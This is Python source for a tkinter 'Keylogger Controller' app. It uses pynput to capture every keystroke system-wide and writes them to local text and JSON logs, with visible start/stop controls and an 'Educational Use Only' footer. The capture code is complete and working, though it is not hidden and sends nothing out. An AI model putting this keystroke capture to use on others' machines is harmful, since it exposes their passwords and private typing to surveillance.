import tkinter as tk
from tkinter import ttk, messagebox, font
from pynput import keyboard
import json
from datetime import datetime
import os
import threading
import platform

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Controller")
        self.root.geometry("700x500")
        self.root.resizable(True, True)
        self.root.configure(bg="#f0f0f0")
        
        # Set application icon
        try:
            if platform.system() == "Windows":
                self.root.iconbitmap("keylogger_icon.ico")
        except:
            pass
        
        # Create output directory if it doesn't exist
        if not os.path.exists("./out"):
            os.makedirs("./out")
        
        # Initialize variables
        self.keys_used = []
        self.flag = False
        self.keys = ""
        self.listener = None
        self.is_running = False
        
        # Create custom fonts
        self.title_font = font.Font(family="Segoe UI", size=24, weight="bold")
        self.subtitle_font = font.Font(family="Segoe UI", size=14)
        self.button_font = font.Font(family="Segoe UI", size=14, weight="bold")
        self.status_font = font.Font(family="Consolas", size=11)
        
        # Create the UI
        self.create_widgets()
        
    def create_widgets(self):
        # Create main container
        main_frame = tk.Frame(self.root, bg="#f0f0f0", padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header with title
        header_frame = tk.Frame(main_frame, bg="#f0f0f0")
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        title_label = tk.Label(header_frame, text="KEYLOGGER CONTROLLER", 
                              font=self.title_font, fg="#2c3e50", bg="#f0f0f0")
        title_label.pack(pady=5)
        
        # Status indicator panel
        status_frame = tk.LabelFrame(main_frame, text=" STATUS ", 
                                    font=self.subtitle_font, fg="#2c3e50", bg="#ffffff", 
                                    bd=1, relief=tk.GROOVE, padx=15, pady=15)
        status_frame.pack(fill=tk.X, pady=10)
        
        # Status indicator with color coding
        status_content = tk.Frame(status_frame, bg="#ffffff")
        status_content.pack(fill=tk.X)
        
        self.status_indicator = tk.Label(status_content, text="●", font=("Arial", 24), 
                                        fg="#e74c3c", bg="#ffffff")
        self.status_indicator.pack(side=tk.LEFT, padx=(0, 15))
        
        self.status_label = tk.Label(status_content, text="Keylogger is currently inactive", 
                                   font=self.subtitle_font, fg="#2c3e50", bg="#ffffff")
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Statistics panel
        stats_frame = tk.LabelFrame(main_frame, text=" STATISTICS ", 
                                  font=self.subtitle_font, fg="#2c3e50", bg="#ffffff", 
                                  bd=1, relief=tk.GROOVE, padx=15, pady=15)
        stats_frame.pack(fill=tk.X, pady=10)
        
        # Create grid for statistics
        stats_grid = tk.Frame(stats_frame, bg="#ffffff")
        stats_grid.pack(fill=tk.X)
        
        # Row 1
        tk.Label(stats_grid, text="Keys Recorded:", font=self.subtitle_font, 
                fg="#7f8c8d", bg="#ffffff", anchor="w").grid(row=0, column=0, sticky="w", padx=10, pady=8)
        self.keys_label = tk.Label(stats_grid, text="0", font=self.subtitle_font, 
                                  fg="#2c3e50", bg="#ffffff")
        self.keys_label.grid(row=0, column=1, sticky="w", padx=10, pady=8)
        
        # Row 2
        tk.Label(stats_grid, text="Log File Location:", font=self.subtitle_font, 
                fg="#7f8c8d", bg="#ffffff", anchor="w").grid(row=1, column=0, sticky="w", padx=10, pady=8)
        self.file_label = tk.Label(stats_grid, text="./out/key_log.txt", font=self.subtitle_font, 
                                  fg="#2c3e50", bg="#ffffff")
        self.file_label.grid(row=1, column=1, sticky="w", padx=10, pady=8)
        
        # Row 3
        tk.Label(stats_grid, text="Current Status:", font=self.subtitle_font, 
                fg="#7f8c8d", bg="#ffffff", anchor="w").grid(row=2, column=0, sticky="w", padx=10, pady=8)
        self.active_label = tk.Label(stats_grid, text="INACTIVE", font=self.subtitle_font, 
                                    fg="#e74c3c", bg="#ffffff")
        self.active_label.grid(row=2, column=1, sticky="w", padx=10, pady=8)
        
        # Configure grid columns to expand
        stats_grid.columnconfigure(0, weight=1)
        stats_grid.columnconfigure(1, weight=3)
        
        # Button panel - now with larger, clearer buttons
        button_frame = tk.Frame(main_frame, bg="#f0f0f0", pady=20)
        button_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create button grid
        button_grid = tk.Frame(button_frame, bg="#f0f0f0")
        button_grid.pack(fill=tk.BOTH, expand=True)
        
        # Column 1: Start button
        start_container = tk.Frame(button_grid, bg="#f0f0f0", padx=10)
        start_container.grid(row=0, column=0, sticky="nsew", padx=10)
        
        self.start_button = tk.Button(start_container, text="▶ START KEYLOGGER", 
                                    font=self.button_font, bg="#27ae60", fg="#ffffff",
                                    activebackground="#2ecc71", activeforeground="#ffffff",
                                    relief=tk.RAISED, padx=20, pady=15,
                                    command=self.start_keylogger)
        self.start_button.pack(fill=tk.BOTH, expand=True)
        
        # Column 2: Stop button
        stop_container = tk.Frame(button_grid, bg="#f0f0f0", padx=10)
        stop_container.grid(row=0, column=1, sticky="nsew", padx=10)
        
        self.stop_button = tk.Button(stop_container, text="■ STOP KEYLOGGER", 
                                   font=self.button_font, bg="#e74c3c", fg="#ffffff",
                                   activebackground="#e74c3c", activeforeground="#ffffff",
                                   relief=tk.RAISED, padx=20, pady=15,
                                   command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(fill=tk.BOTH, expand=True)
        
        # Column 3: View Logs button
        logs_container = tk.Frame(button_grid, bg="#f0f0f0", padx=10)
        logs_container.grid(row=0, column=2, sticky="nsew", padx=10)
        
        self.logs_button = tk.Button(logs_container, text="📁 VIEW LOGS", 
                                    font=self.button_font, bg="#3498db", fg="#ffffff",
                                    activebackground="#3498db", activeforeground="#ffffff",
                                    relief=tk.RAISED, padx=20, pady=15,
                                    command=self.view_logs)
        self.logs_button.pack(fill=tk.BOTH, expand=True)
        
        # Configure grid to expand buttons
        button_grid.columnconfigure(0, weight=1)
        button_grid.columnconfigure(1, weight=1)
        button_grid.columnconfigure(2, weight=1)
        button_grid.rowconfigure(0, weight=1)
        
        # Footer
        footer_frame = tk.Frame(self.root, bg="#2c3e50", height=40)
        footer_frame.pack(fill=tk.X, side=tk.BOTTOM)
        
        footer_label = tk.Label(footer_frame, text="Educational Use Only | Use Responsibly", 
                               font=("Segoe UI", 10), fg="#ecf0f1", bg="#2c3e50")
        footer_label.pack(pady=10)
        
        # Apply minimum sizes to window
        self.root.update()
        self.root.minsize(700, 500)
    
    def generate_text_log(self, key):
        """Generate text log file with recorded keystrokes"""
        with open("./out/key_log.txt", "w+", encoding="utf-8") as f:
            f.write(key)
    
    def generate_json_file(self, used_keys):
        """Generate JSON log file with keystroke events"""
        with open("./out/key_log.json", "w", encoding="utf-8") as f:
            json.dump(used_keys, f, indent=2)
    
    def on_press(self, key):
        """Handle key press events"""
        if not self.flag:
            self.keys_used.append({"Pressed": f"{key}"})
            self.flag = True
        
        if self.flag:
            self.keys_used.append({"Held": f"{key}"})
        
        self.keys_label.config(text=str(len(self.keys_used)))
        self.generate_json_file(self.keys_used)
    
    def on_release(self, key):
        """Handle key release events"""
        self.keys_used.append({"Released": f"{key}"})
        
        if self.flag:
            self.flag = False
        
        self.keys = self.keys + str(key)
        self.generate_text_log(str(self.keys))
        self.generate_json_file(self.keys_used)
    
    def start_keylogger(self):
        """Start the keylogger"""
        self.is_running = True
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        # Update UI
        self.status_indicator.config(fg="#2ecc71")
        self.status_label.config(text="Keylogger is actively capturing keystrokes", fg="#2c3e50")
        self.active_label.config(text="ACTIVE", fg="#27ae60")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Create a notification
        self.show_notification("Keylogger Started", "Keystroke logging is now active.")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        self.is_running = False
        
        # Update UI
        self.status_indicator.config(fg="#e74c3c")
        self.status_label.config(text="Keylogger is currently inactive", fg="#2c3e50")
        self.active_label.config(text="INACTIVE", fg="#e74c3c")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        # Create a notification
        self.show_notification("Keylogger Stopped", "Keystroke logging has been terminated.")
        
        # Reset counters
        self.keys_used = []
        self.keys_label.config(text="0")
    
    def view_logs(self):
        """Open log directory"""
        try:
            if platform.system() == "Windows":
                os.startfile("./out")
            elif platform.system() == "Darwin":  # macOS
                os.system("open ./out")
            else:  # Linux variants
                os.system("xdg-open ./out")
        except Exception as e:
            messagebox.showinfo("Log Files", f"Log files are stored in the 'out' directory.\n\nError: {str(e)}")
    
    def show_notification(self, title, message):
        """Show a notification popup"""
        notification = tk.Toplevel(self.root)
        notification.title(title)
        notification.geometry("350x120")
        notification.configure(bg="#ffffff")
        notification.resizable(False, False)
        
        # Center the notification on the main window
        x = self.root.winfo_x() + (self.root.winfo_width() // 2) - 175
        y = self.root.winfo_y() + (self.root.winfo_height() // 2) - 60
        notification.geometry(f"+{x}+{y}")
        
        # Notification content
        tk.Label(notification, text=title, font=self.subtitle_font, 
                fg="#2c3e50", bg="#ffffff").pack(pady=(15, 5))
        tk.Label(notification, text=message, font=("Segoe UI", 11), 
                fg="#7f8c8d", bg="#ffffff").pack(pady=5)
        
        # Close button
        close_btn = tk.Button(notification, text="OK", font=("Segoe UI", 10), 
                             command=notification.destroy, width=10)
        close_btn.pack(pady=10)
        
        # Make the notification stay on top
        notification.transient(self.root)
        notification.grab_set()
        self.root.wait_window(notification)

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()